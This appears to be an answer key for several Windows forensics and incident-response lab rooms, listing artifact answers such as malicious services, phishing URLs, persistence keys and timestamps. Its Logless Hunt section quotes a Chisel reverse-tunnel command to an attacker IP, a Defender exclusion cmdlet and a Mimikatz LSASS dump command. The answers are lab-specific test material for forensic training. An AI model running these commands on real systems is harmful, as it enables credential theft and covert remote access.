# Windows Endpoint Investigation

## Windows Incident Surface
### Task 1
- Tool the adversary used to delete the logs: `wevtutil`
- Registry path used to store/steal login credentials: `HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest`

### Task 2
- Hostname of the compromised host: `CCTL-WS-018-b21`
- OS version: `10.0.17763`
- Time ID (timezone) of the host: `Turkey Standard Time`

### Task 3
- Total number of suspicious accounts: `3`
- SID of the Guest account: `S-1-5-21-1966530601-3185510712-10604624-501`
- Last login of the Admin account (with the typo): `2/28/2024 10:21:10 AM`

### Task 4
- Malicious process (defanged): `INITIAL_LANTERN[.]exe`
- Directory path of the malicious process: `C:\Users\Administrator\AppData\SpcTmp\`
- Remote port used by the malicious process: `8888`
- Full path of the suspicious AnyDesk program (defanged): `D:\AnyDesk[.]exe`
- Port used by the LMV Co. firewall rules: `5985`

### Task 5
- User account used to run AnyDesk: `Public`
- Value data in the "Userinit" key (defanged): `C:\Windows\system32\userinit[.]exe, cmd[.]exe /c "start /min netsh[.]exe -c"`
- Suspicious DLL under the netshell hive key: `.\fwshield.dll`

### Task 6
- Suspicious active service: `LMVCSS`
- SHA256 of the active service executable: `E9AA7564B2D1D612479E193A9F8CB70DF9CFBE02A39900EEE22FE266F5320EBF`
- Non-running service that caught attention: `aurora-agent`
- SHA256 of the non-running service executable: `D5C8BF2D3B56B21639D8152DB277DD714BA1A61BDAF2350BD0FF7E61D2A99003`
- Original filename of the non-running service executable (defanged): `x3xv5weg[.]exe`

### Task 7
- Parent process of INITIAL_LANTERN (defanged): `services[.]exe`
- Username used for SSH connection attempts: `James`
- Parent process of the malicious aurora process (defanged): `svchost[.]exe`
- File in the default user's temp directory (defanged): `jmp[.]exe`
- Potential proxy script in the suspicious temp folder (defanged): `Invoke-SocksProxy[.]psm1`
- SHA256 of the proxy script: `E7697645F36DE5978C1B640B6B3FC819E55B00EE8D9E9798919C11CC7A6FC88B`
- Label of the hidden disc volume: `Setups`

## Compromised Windows Analysis
- User whose system generated suspicious SSH traffic to a malicious IP: `Aashir`
- Tool that makes it easier to analyze CSV files: `Timeline Explorer`
- Name of the scheduled task created by the attacker: `CnC`
- IP of the malicious server SSH requests are made to: `101.55.125.10`
- Name of the RAR file created during the attack: `Cursed.rar`
- When the RAR file was created: `2025-03-29 10:26:07`
- Name of the malicious executable file: `cipher.exe`
- Full path of the malicious file: `c:\users\administrator\desktop\cursed\cipher.exe`
- SHA1 of that file: `5b15c9d9ef36cae9f24ce63eebd190ac381bb734`
- When Defender was disabled (12-hour clock): `10:25:14 AM`
- IP address of the attacker's system: `10.11.90.211`

> The prefetch run count and last-run time of `cipher.exe` are lab-specific — read them from `Prefetch-Parsed.csv` (Run Count / Last Run columns).

## Windows User Account Forensics
- What centrally manages local user accounts and domain accounts: `Domain Controller`
- Accounts used by Windows OS and apps: `System and Service Accounts`
- Users found using the DSInternals command: `5`
- Value of the "bootKey" variable: `36c8d26ec0df8b23ce63bcefa6e2d821`
- SID of domain user m.ascot: `S-1-5-21-1966530601-3185510712-10604624-1111`
- Username used for NTLM authentication: `admin`
- Server Challenge during the NTLM handshake: `212ba239356b3d82`
- DNS name of the other DsGetDomainControllerInfo result: `dcfr.lab.lan`
- User specified as the apply target for the Policy: `Michael Ascot`
- Real-time Protection setting enabled: `Turn off real-time protection`
- Malicious startup PowerShell script filename (no extension): `superimportant-updated`
- C2 server IP the script exfiltrates to: `192.0.2.123`

## Windows User Activity Analysis
- Tools/folders in the EZ tools folder: `12`
- Hive storing installed software info: `Software`
- Current size of the SAM hive (KB): `128`
- Full path of the tmp directory where code.txt was accessed: `C:\system\home\tmp\code.txt`
- Latest term in WordWheelQuery: `wipe`
- Last text file saved by the suspect: `C:\system\home\tmp\code.txt`
- Keylogging tool run 5 times from Hacking-tools: `keylogger.exe`
- Disk wiping utility executed: `DiskWipe.exe`
- IP of the network share where three folders were accessed: `10.10.17.228`
- Second sub-folder in Documents on that share: `secret-doc`
- Document last opened by the user: `10_ways_to_Exfiltrate_Data.pdf`
- Full network path from code.lnk: `\\10.10.17.228\Users\Administrator\Documents\secret-documents`
- URL accessed using Internet Explorer: `http://10.10.17.228/`
- When the user accessed "How to Hack.pdf": `2024-03-04 12:28:26`

## Expediting Registry Analysis
- Acquisition from a disk image: `Cold Acquisition`
- Is speed an advantage of FTK Imager registry collection? `N`
- _kape.cli contents (C→D, RegistryHives): `--tsource C: --tdest D:\ --target RegistryHives`
- Computer Name: `4N6`
- TimeZoneKeyName: `UTC`
- LastKnownGood control set: `2`
- Account created last: `suspicious`
- Password Reset Date of that account: `2024-03-03 11:51:04Z`
- RID of account 4n6lab: `1008`
- 3 accounts in Administrators group (ascending RID): `administrator, 4n6lab, suspicious`
- Gateway MAC last connected in 2021: `0A-41-2A-ED-DB-34`
- When that network was last connected: `3/17/2021 14:59`
- When "Network 2" first connected: `3/17/2021 15:08`
- System name: `JAMES`
- Other admin-group user besides administrator: `art-test`
- VPN network name: `ProtonVPN`
- Organization Windows is registered to: `Amazon.com`

## Windows Applications Forensics
- Who created the malicious scheduled tasks: `mike.myers`
- URL accessed by the malicious task (defanged): `hxxp[://]hrcbishtek[.]com/a`
- Name of the malicious service: `server power`
- What the second malicious task executes: `C:\Users\Public\pagefilerpqy.exe`
- Time the second task executes daily: `17:21`
- Full path of the binary run by the second malicious service: `C:\Windows\Temp\aKzjdD.exe`
- Last write time of the second malicious service: `03/07/2024 17:53:53`
- First phishing URL accessed (defanged): `hxxps[://]login[.]lohelper[.]com/auth/client_id=59bcc3ad677`
- Time that URL was accessed (UTC): `03/04/2024 20:53:32`
- O365 cookie seen on the phishing site: `ESTSAUTHPERSISTENT`
- URL the malicious Chrome extension reports to: `hxxps[://]kamehasuitens[.]info/track`
- First Edge URL for the malicious domain: `hxxps[://]login[.]dxsupport[.]net/mmTQJpka`
- Phishing email sender: `julianne.westcott@hotmail.com`
- Malicious attachment via Teams: `system_update.zip`
- URL inside the attachment: `hxxp[://]cdn[.]nautilusco[.]net/a[.]ps1`
- Unusual SharePoint site synced: `https://swiftspendlogistics.sharepoint.com/sites/ProjectManagement`

## Windows Network Analysis
- Feature tracking last 30–60 days of stats: `System Resource Usage Monitor`
- Firewall log output path: `C:\Windows\System32\LogFiles\Firewall\pfirewall.log`
- Cmdlet to display active TCP connections: `Get-NetTCPConnection`
- Cmdlet to display the DNS cache: `Get-DnsClientCache`
- Command to list active RDP sessions: `qwinsta`
- netstat flag for the executable responsible: `-b`
- netstat flag for TCP connections + PID: `-o`
- Character to save netstat output to a file: `>`
- Active reverse-shell port: `4444`
- Process connecting to the C2 server: `pythonw.exe`
- Domain added to the hosts file: `attackerc2.thm`
- SRUM data-exfil process path: `\device\harddiskvolume3\program files\updater\exfil.exe`
- SMB share that stands out: `confidential`

## Logless Hunt
- Earliest Event ID in Security logs: `1102`
- Title of the HR01-SRV web app on port 80: `Salary Raise Approver v0.1`
- IP that performed the web scan: `10.10.23.190`
- Path of the uploaded file: `C:\Apache24\htdocs\uploads\search.php`
- What you'd call the uploaded malware: `Web Shell`
- First command entered by the attacker: `whoami`
- Full URL of the file the attacker downloaded: `http://10.10.23.190:8080/httpd-proxy.exe`
- Command to exclude the file from Defender: `Add-MpPreference -ExclusionPath C:\Apache24`
- Remote access service tunnelled: `RDP`
- Timestamp of the first suspicious RDP login: `2025-01-23 17:00:12`
- User the attacker breached: `HR01-SRV\Administrator`
- Source IP of the RDP login: `10.10.23.190`
- When the attacker disconnected from RDP: `2025-01-23 17:16:46`
- Suspicious scheduled task name: `Apache Proxy`
- When it was created: `2025-01-23 17:05:37`
- Task trigger value: `At system startup`
- Full command line of the malicious task: `C:\Apache24\bin\httpd-proxy.exe client 10.10.23.190:10443 R:3389:127.0.0.1:3389`
- Threat family of first quarantined file: `VirTool:Win64/Chisel.G`
- Threat family of next malware: `HackTool:Win32/Mimikatz!pz`
- Downloaded Mimikatz filename: `mimi.exe`
- Mimikatz command to extract hashes from LSASS: `lsadump::lsa /inject`

## Blizzard (challenge)
### Task 1
- When the attacker accessed from another internal machine: `03/24/2024 19:38:48`
- Full file path of the exfil binary: `C:\Users\dbadmin\.rclone\rclone-v1.66.0-windows-amd64\rclone.exe`
- Email used to exfiltrate data: `annajones291@hotmail.com`
- Registry value name of the persistent implant: `SecureUpdate`
- When the alternative backdoor was implanted: `03/24/2024 20:04:05`

### Task 2
- When the attacker sent the malicious email: `03/24/2024 19:06:27`
- When the victim opened the payload: `03/24/2024 19:07:46`
- File used to access the DB server + password: `demo_automation.ps1` → `db@dm1nS3cur3Pass!`
- When the persistent implant was created: `03/24/2024 19:16:23`
- Domain accessed by the implant (defanged): `advancedsolutions[.]net`

### Task 3 (phishing)
- When the victim received the malicious phishing message: `03/24/2024 18:36:34`
- Display name of the attacker: `Microsoft Identity Provider`
- URL of the malicious phishing link (defanged): `hxxps[://]login[.]sourcesecured[.]com/support/id/XkSkj321`
- Title of the phishing website: *(lab-specific — read from the browser-history page title field)*
- When the victim first accessed the phishing website (UTC): `03/24/2024 18:38:29`
